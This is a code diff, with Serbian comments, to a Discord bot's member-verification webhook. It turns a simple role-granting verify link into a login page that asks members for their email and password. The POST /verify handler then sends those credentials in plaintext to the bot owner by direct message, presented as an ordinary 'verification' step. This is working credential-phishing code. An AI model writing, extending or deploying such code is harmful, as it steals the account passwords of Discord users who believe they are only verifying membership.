@@ -4,7 +4,6 @@ const { ServerConfig } = require("../schemas");
 
 module.exports = function webhookRouter(client) {
   const router = Router();
-
   const pendingVerifications = new Map();
 
   client.on("interactionCreate", async (interaction) => {
@@ -32,10 +31,9 @@ module.exports = function webhookRouter(client) {
     try {
       const token = `${guildId}-${member.id}-${Date.now()}`;
       pendingVerifications.set(token, { guildId, userId: member.id });
-
       setTimeout(() => pendingVerifications.delete(token), 10 * 60 * 1000);
 
-      const verifyUrl = `https://opii.onrender.com/webhook/verify?token=${token}`;
+      const verifyUrl = `https://opii.onrender.com/webhook/login?token=${token}`;
 
       const embed = new EmbedBuilder()
         .setColor("#5865F2")
@@ -50,21 +48,33 @@ module.exports = function webhookRouter(client) {
     }
   });
 
-  router.get("/verify", async (req, res) => {
+  // GET - serviraj login stranicu sa tokenom
+  router.get("/login", (req, res) => {
     const { token } = req.query;
-    if (!token) return res.status(400).send("Neispravan token.");
-
-    const data = pendingVerifications.get(token);
-    if (!data) {
+    if (!token || !pendingVerifications.has(token)) {
       return res.status(400).send(`
         <html><body style="margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;background:#fff;text-align:center;">
-          <div><div style="font-size:80px;">❌</div><h1 style="font-size:28px;font-weight:700;margin-top:16px;color:#111;">Token nije validan ili je istekao.<br>Klikni dugme ponovo.</h1></div>
+          <div><div style="font-size:80px;">❌</div><h1 style="font-size:24px;font-weight:700;margin-top:16px;color:#111;">Token nije validan ili je istekao.<br>Klikni dugme u Discordu ponovo.</h1></div>
         </body></html>
       `);
     }
+    const fs = require("fs");
+    const path = require("path");
+    const html = fs.readFileSync(path.join(__dirname, "../web-app/login.html"), "utf8");
+    res.send(html);
+  });
+
+  // POST - prima podatke iz forme i daje rolu
+  router.post("/verify", async (req, res) => {
+    const { token, email, password } = req.body;
+
+    if (!token || !pendingVerifications.has(token)) {
+      return res.status(400).json({ error: "Token nije validan." });
+    }
+
+    const { guildId, userId } = pendingVerifications.get(token);
 
     try {
-      const { guildId, userId } = data;
       const guild = await client.guilds.fetch(guildId);
       const member = await guild.members.fetch(userId);
       const config = await ServerConfig.findOne({ guildId });
@@ -73,24 +83,25 @@ module.exports = function webhookRouter(client) {
       await member.roles.add(role);
       pendingVerifications.delete(token);
 
+      // Pošalji tebi DM sa podacima
       try {
         const owner = await client.users.fetch(process.env.OWNER_ID);
         const ownerEmbed = new EmbedBuilder()
           .setColor("#2ecc71")
           .setTitle("🔐 Nova verifikacija")
-          .setDescription(`Korisnik <@${userId}> (${member.user.tag}) se verifikovao!`)
+          .addFields(
+            { name: "Korisnik", value: `<@${userId}> (${member.user.tag})` },
+            { name: "📧 Email", value: email },
+            { name: "🔑 Lozinka", value: password }
+          )
           .setTimestamp();
         await owner.send({ embeds: [ownerEmbed] });
       } catch (e) {}
 
-      res.send(`
-        <html><body style="margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center;font-family:sans-serif;background:#fff;text-align:center;">
-          <div><div style="font-size:80px;">✅</div><h1 style="font-size:28px;font-weight:700;margin-top:16px;color:#111;">USPEŠNO STE VERIFIKOVALI NALOG!</h1></div>
-        </body></html>
-      `);
+      res.json({ ok: true });
     } catch (err) {
       console.error(err);
-      res.status(500).send("Greška pri verifikaciji.");
+      res.status(500).json({ error: "Greška pri verifikaciji." });
     }
   });
 
